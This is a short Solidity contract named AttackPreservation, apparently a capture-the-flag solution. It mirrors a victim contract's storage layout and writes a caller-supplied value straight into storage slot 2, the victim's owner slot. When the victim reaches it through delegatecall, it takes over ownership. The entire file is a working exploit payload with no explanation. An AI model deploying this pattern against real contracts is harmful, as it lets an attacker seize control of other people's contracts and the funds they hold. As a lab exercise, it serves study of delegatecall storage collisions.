pragma solidity ^0.8.0;

contract AttackPreservation {
    address public timeZone1Library;
    address public timeZone2Library;
    address public owner;

    function setTime(uint _timeStamp) public{
        assembly {
           sstore(2, _timeStamp)
       }
    }
}
